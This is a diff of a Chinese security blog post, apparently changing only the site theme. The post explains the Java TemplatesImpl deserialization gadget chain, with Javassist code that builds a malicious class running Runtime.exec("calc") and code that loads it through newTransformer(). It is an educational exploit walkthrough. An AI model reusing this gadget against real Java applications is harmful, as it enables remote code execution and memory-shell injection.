@@ -1,194 +1,658 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TemplatesImpl类中的调用链 | LvYz的小窝</title><meta name="author" content="LvYz"><meta name="copyright" content="LvYz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="背景TemplatesImpl利用链是一个非常重要的东西，要知道，CC链可以用它，CB链也用它，注入内存马还是用它。为什么？因为它可以加载java字节码并实例化。相对于调用Runtime.exec进行命令执行，加载恶意代码更贴合我们的使用。 调用链的基本过程，反序列化中可以用例如CC链中的任意方法调用来触发这条链子TemplatesImpl#newTransformer() -&gt;">
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="LvYz">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="背景TemplatesImpl利用链是一个非常重要的东西，要知道，CC链可以用它，CB链也用它，注入内存马还是用它。为什么？因为它可以加载java字节码并实例化。相对于调用Runtime.exec进行命令执行，加载恶意代码更贴合我们的使用。 12345调用链的基本过程，反序列化中可以用例如CC链中的任意方法调用来触发这条链子TemplatesImpl#newTransformer() -&gt;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="TemplatesImpl类中的调用链">
 <meta property="og:url" content="https://lvyzcc.github.io/2025/03/29/TemplatesImpl%E7%B1%BB%E4%B8%AD%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE/index.html">
 <meta property="og:site_name" content="LvYz的小窝">
-<meta property="og:description" content="背景TemplatesImpl利用链是一个非常重要的东西，要知道，CC链可以用它，CB链也用它，注入内存马还是用它。为什么？因为它可以加载java字节码并实例化。相对于调用Runtime.exec进行命令执行，加载恶意代码更贴合我们的使用。 调用链的基本过程，反序列化中可以用例如CC链中的任意方法调用来触发这条链子TemplatesImpl#newTransformer() -&gt;">
+<meta property="og:description" content="背景TemplatesImpl利用链是一个非常重要的东西，要知道，CC链可以用它，CB链也用它，注入内存马还是用它。为什么？因为它可以加载java字节码并实例化。相对于调用Runtime.exec进行命令执行，加载恶意代码更贴合我们的使用。 12345调用链的基本过程，反序列化中可以用例如CC链中的任意方法调用来触发这条链子TemplatesImpl#newTransformer() -&gt;">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://lvyzcc.github.io/img/avatar.jpg">
+<meta property="og:image" content="https://lvyzcc.github.io/img/TemplatesImpl/defineclass.png">
+<meta property="og:image" content="https://lvyzcc.github.io/img/TemplatesImpl/defineclass2.png">
+<meta property="og:image" content="https://lvyzcc.github.io/img/TemplatesImpl/defineclass3.png">
+<meta property="og:image" content="https://lvyzcc.github.io/img/TemplatesImpl/defineclass4.png">
+<meta property="og:image" content="https://lvyzcc.github.io/img/TemplatesImpl/defineclass5.png">
+<meta property="og:image" content="https://lvyzcc.github.io/img/TemplatesImpl/defineclass6.png">
 <meta property="article:published_time" content="2025-03-29T08:13:42.000Z">
 <meta property="article:modified_time" content="2025-04-02T07:04:52.266Z">
 <meta property="article:author" content="LvYz">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://lvyzcc.github.io/img/avatar.jpg"><script type="application/ld+json">{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "TemplatesImpl类中的调用链",
-  "url": "https://lvyzcc.github.io/2025/03/29/TemplatesImpl%E7%B1%BB%E4%B8%AD%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE/",
-  "image": "https://lvyzcc.github.io/img/avatar.jpg",
-  "datePublished": "2025-03-29T08:13:42.000Z",
-  "dateModified": "2025-04-02T07:04:52.266Z",
-  "author": [
-    {
-      "@type": "Person",
-      "name": "LvYz",
-      "url": "https://lvyzcc.github.io/"
-    }
-  ]
-}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://lvyzcc.github.io/2025/03/29/TemplatesImpl%E7%B1%BB%E4%B8%AD%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
-    (() => {
-      
-    const saveToLocal = {
-      set: (key, value, ttl) => {
-        if (!ttl) return
-        const expiry = Date.now() + ttl * 86400000
-        localStorage.setItem(key, JSON.stringify({ value, expiry }))
-      },
-      get: key => {
-        const itemStr = localStorage.getItem(key)
-        if (!itemStr) return undefined
-        const { value, expiry } = JSON.parse(itemStr)
-        if (Date.now() > expiry) {
-          localStorage.removeItem(key)
-          return undefined
-        }
-        return value
-      }
-    }
-
-    window.btf = {
-      saveToLocal,
-      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
-        const script = document.createElement('script')
-        script.src = url
-        script.async = true
-        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
-        script.onload = script.onreadystatechange = () => {
-          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
-        }
-        script.onerror = reject
-        document.head.appendChild(script)
-      }),
-      getCSS: (url, id) => new Promise((resolve, reject) => {
-        const link = document.createElement('link')
-        link.rel = 'stylesheet'
-        link.href = url
-        if (id) link.id = id
-        link.onload = link.onreadystatechange = () => {
-          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
-        }
-        link.onerror = reject
-        document.head.appendChild(link)
-      }),
-      addGlobalFn: (key, fn, name = false, parent = window) => {
-        if (!false && key.startsWith('pjax')) return
-        const globalFn = parent.globalFn || {}
-        globalFn[key] = globalFn[key] || {}
-        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
-        parent.globalFn = globalFn
-      }
-    }
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://lvyzcc.github.io/img/TemplatesImpl/defineclass.png">
   
-      
-      const activateDarkMode = () => {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      const activateLightMode = () => {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
+  
+  
+  <title>TemplatesImpl类中的调用链 - LvYz的小窝</title>
 
-      btf.activateDarkMode = activateDarkMode
-      btf.activateLightMode = activateLightMode
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
-      const theme = saveToLocal.get('theme')
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"lvyzcc.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
     
-          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>LvYzCc</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="TemplatesImpl类中的调用链"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-29 16:13" pubdate>
+          2025年3月29日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          669 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          6 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
       
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
-      }
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
     
       
-    const detectApple = () => {
-      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
-        document.documentElement.classList.add('apple')
-      }
-    }
-    detectApple()
-  
-    })()
-  </script><script>const GLOBAL_CONFIG = {
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
-  copy: {
-    success: '复制成功',
-    error: '复制失败',
-    noSupport: '浏览器不支持'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  dateSuffix: {
-    just: '刚刚',
-    min: '分钟前',
-    hour: '小时前',
-    day: '天前',
-    month: '个月前'
-  },
-  copyright: undefined,
-  lightbox: 'null',
-  Snackbar: undefined,
-  infinitegrid: {
-    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
-    buttonText: '加载更多'
-  },
-  isPhotoFigcaption: false,
-  islazyloadPlugin: false,
-  isAnchor: false,
-  percent: {
-    toc: true,
-    rightside: false,
-  },
-  autoDarkmode: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: 'TemplatesImpl类中的调用链',
-  isHighlightShrink: false,
-  isToc: true,
-  pageType: 'post'
-}</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
-  const $loadingBox = document.getElementById('loading-box')
-  const $body = document.body
-  const preloader = {
-    endLoading: () => {
-      $body.style.overflow = ''
-      $loadingBox.classList.add('loaded')
-    },
-    initLoading: () => {
-      $body.style.overflow = 'hidden'
-      $loadingBox.classList.remove('loaded')
-    }
-  }
 
-  preloader.initLoading()
-  window.addEventListener('load', preloader.endLoading)
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
 
-  if (false) {
-    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
-    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
-  }
-})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">LvYz的小窝</span></a><a class="nav-page-title" href="/"><span class="site-name">TemplatesImpl类中的调用链</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">TemplatesImpl类中的调用链</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-29T08:13:42.000Z" title="发表于 2025-03-29 16:13:42">2025-03-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-02T07:04:52.266Z" title="更新于 2025-04-02 15:04:52">2025-04-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/">知识点</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>TemplatesImpl利用链是一个非常重要的东西，要知道，CC链可以用它，CB链也用它，注入内存马还是用它。为什么？因为它可以加载java字节码并实例化。相对于调用Runtime.exec进行命令执行，加载恶意代码更贴合我们的使用。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">调用链的基本过程，反序列化中可以用例如CC链中的任意方法调用来触发这条链子</span><br><span class="line">TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">        TemplatesImpl#getTransletInstance() -&gt;</span><br><span class="line">            TemplatesImpl#defineTransletClasses()-&gt;</span><br><span class="line">                TransletClassLoader#defineClass()-&gt;</span><br></pre></td></tr></table></figure>
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">TemplatesImpl类中的调用链</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>TemplatesImpl利用链是一个非常重要的东西，要知道，CC链可以用它，CB链也用它，注入内存马还是用它。为什么？因为它可以加载java字节码并实例化。相对于调用Runtime.exec进行命令执行，加载恶意代码更贴合我们的使用。</p>
+<figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs leaf">调用链的基本过程，反序列化中可以用例如CC链中的任意方法调用来触发这条链子<br>TemplatesImpl<span class="hljs-punctuation">#</span><span class="hljs-keyword">newTransformer</span><span class="hljs-params">()</span> -&gt;<br>        TemplatesImpl<span class="hljs-punctuation">#</span><span class="hljs-keyword">getTransletInstance</span><span class="hljs-params">()</span> -&gt;<br>            TemplatesImpl<span class="hljs-punctuation">#</span><span class="hljs-keyword">defineTransletClasses</span><span class="hljs-params">()</span>-&gt;<br>                TransletClassLoader<span class="hljs-punctuation">#</span><span class="hljs-keyword">defineClass</span><span class="hljs-params">()</span>-&gt;<br></code></pre></td></tr></table></figure>
 <h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>ClassLoader，类加载器，是JVM执行类加载机制的前提，其主要任务为根据一个类的全限定名来读取此类的二进制字节流到JVM内部，然后转换为一个与目标类对应的java.lang.Class对象实例。</p>
 <h2 id="defineClass加载器"><a href="#defineClass加载器" class="headerlink" title="defineClass加载器"></a>defineClass加载器</h2><p>对于我们利用漏洞简单的来说，就是ClassLoader中的defineClass加载器能过获取我们给他的字节码从而读取成类，在这个过程中若这个字节码对应的类中存放有恶意内容就可以触发</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span><br><span class="line">CtClass cc = pool.makeClass(&quot;Test&quot;);//创造类</span><br><span class="line">cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));//设置父类</span><br><span class="line">CtConstructor constructor = cc.makeClassInitializer();//创造空的构造函数</span><br><span class="line">constructor.insertBefore(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);//插入静态代码块</span><br><span class="line">byte[] bytes=cc.toBytecode();//转换成字节码</span><br><span class="line"></span><br><span class="line">这里用javassist类创造一个带有static代码块运行后会触发计算器的恶意类(Javaassist 就是一个用来 处理 Java 字节码的</span><br><span class="line">类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已</span><br><span class="line">有的方法，并且不需要对字节码方面有深入的了解。同时也可以去生</span><br><span class="line">成一个新的类对象，通过完全手动的方式。)</span><br></pre></td></tr></table></figure>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stata">ClassPool pool = ClassPool.getDefault();<br>pool.insertClassPath(new ClassClassPath(AbstractTranslet.<span class="hljs-keyword">class</span>));<br>CtClass <span class="hljs-keyword">cc</span> = pool.makeClass(<span class="hljs-string">&quot;Test&quot;</span>);<span class="hljs-comment">//创造类</span><br><span class="hljs-keyword">cc</span>.setSuperclass(pool.<span class="hljs-built_in">get</span>(AbstractTranslet.<span class="hljs-keyword">class</span>.getName()));<span class="hljs-comment">//设置父类</span><br>CtConstructor constructor = <span class="hljs-keyword">cc</span>.makeClassInitializer();<span class="hljs-comment">//创造空的构造函数</span><br>constructor.insertBefore(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;</span>calc\<span class="hljs-string">&quot;);&quot;</span>);<span class="hljs-comment">//插入静态代码块</span><br>byte[] bytes=<span class="hljs-keyword">cc</span>.toBytecode();<span class="hljs-comment">//转换成字节码</span><br><br>这里用javassist类创造一个带有static代码块运行后会触发计算器的恶意类(Javaassist 就是一个用来 处理 Java 字节码的<br>类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已<br>有的方法，并且不需要对字节码方面有深入的了解。同时也可以去生<br>成一个新的类对象，通过完全手动的方式。)<br></code></pre></td></tr></table></figure>
 
-<h2 id="触发链过程"><a href="#触发链过程" class="headerlink" title="触发链过程"></a>触发链过程</h2><p>我们最终的目标是要触发defineClass加载器<br><img src="/../img/TemplatesImpl/defineclass.png" alt="defineclass"><br>但是classloader类中他是protected型，我们需要找到能调用他的方法，我们寻找所有使用defineclass方法的地方<br><img src="/../img/TemplatesImpl/defineclass2.png" alt="defineclass"><br>在TemplatesImpl中的内置类TransletClassLoader(CLassLoader的子类)中找到，继续寻找调用它defineclass方法的地方</p>
-<p><img src="/../img/TemplatesImpl/defineclass3.png" alt="defineclass"><br>在这个类的defineTransletClasses中调用了他，继续找谁调用了defineTransletClasses<br><img src="/../img/TemplatesImpl/defineclass4.png" alt="defineclass"><br>getTransletInstance方法调用了defineTransletClasses<br><img src="/../img/TemplatesImpl/defineclass5.png" alt="defineclass"><br>但是注意_class值不能为null</p>
-<p>最后便是newTransformer调用了getTransletInstance<br><img src="/../img/TemplatesImpl/defineclass6.png" alt="defineclass"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl obj=new TemplatesImpl();</span><br><span class="line">setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);//恶意类字节码</span><br><span class="line">setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);//该值任意</span><br><span class="line">setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());//必须为TransformerFactoryImpl实例</span><br><span class="line">obj.newTransformer();</span><br></pre></td></tr></table></figure>
+<h2 id="触发链过程"><a href="#触发链过程" class="headerlink" title="触发链过程"></a>触发链过程</h2><p>我们最终的目标是要触发defineClass加载器<br><img src="/../img/TemplatesImpl/defineclass.png" srcset="/img/loading.gif" lazyload alt="defineclass"><br>但是classloader类中他是protected型，我们需要找到能调用他的方法，我们寻找所有使用defineclass方法的地方<br><img src="/../img/TemplatesImpl/defineclass2.png" srcset="/img/loading.gif" lazyload alt="defineclass"><br>在TemplatesImpl中的内置类TransletClassLoader(CLassLoader的子类)中找到，继续寻找调用它defineclass方法的地方</p>
+<p><img src="/../img/TemplatesImpl/defineclass3.png" srcset="/img/loading.gif" lazyload alt="defineclass"><br>在这个类的defineTransletClasses中调用了他，继续找谁调用了defineTransletClasses<br><img src="/../img/TemplatesImpl/defineclass4.png" srcset="/img/loading.gif" lazyload alt="defineclass"><br>getTransletInstance方法调用了defineTransletClasses<br><img src="/../img/TemplatesImpl/defineclass5.png" srcset="/img/loading.gif" lazyload alt="defineclass"><br>但是注意_class值不能为null</p>
+<p>最后便是newTransformer调用了getTransletInstance<br><img src="/../img/TemplatesImpl/defineclass6.png" srcset="/img/loading.gif" lazyload alt="defineclass"></p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haxe">TemplatesImpl obj=<span class="hljs-keyword">new</span> <span class="hljs-type">TemplatesImpl</span>();<br>setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">byte</span>[][]&#123;bytes&#125;);<span class="hljs-comment">//恶意类字节码</span><br>setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<span class="hljs-comment">//该值任意</span><br>setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">TransformerFactoryImpl</span>());<span class="hljs-comment">//必须为TransformerFactoryImpl实例</span><br>obj.<span class="hljs-keyword">new</span><span class="hljs-type">Transformer</span>();<br></code></pre></td></tr></table></figure>
 <p>那么触发链就清晰了，注意为了顺利到达触发点,这三个值不能为null(“_bytecodes”,”_name”,”_tfactory”)并且恶意类父类需为AbstractTranslet</p>
 <p>这里的如何触发newTransformer()在CC链中再讲</p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://lvyzcc.github.io">LvYz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lvyzcc.github.io/2025/03/29/TemplatesImpl%E7%B1%BB%E4%B8%AD%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE/">https://lvyzcc.github.io/2025/03/29/TemplatesImpl%E7%B1%BB%E4%B8%AD%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://lvyzcc.github.io" target="_blank">LvYz的小窝</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script 